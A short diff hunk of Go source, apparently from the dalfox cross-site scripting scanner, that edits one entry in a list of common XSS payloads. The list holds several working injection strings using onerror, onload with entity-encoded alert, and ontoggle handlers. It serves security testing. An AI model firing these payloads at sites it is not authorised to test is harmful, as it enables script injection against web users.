@@ -21,7 +21,7 @@ func getCommonPayload() []string {
 		"\"><img/src/onerror=.1|alert`` class=dalfox>",
 		"'><img/src/onerror=.1|alert`` class=dalfox>",
 		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
-		"</script><svg><script/class=dalfox>alert(45)-%26apos%3B",
+		"</script><svg><script/class=dalfox>alert(45)</script>-%26apos%3B",
 		"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>",
 
 		// not include verify payload
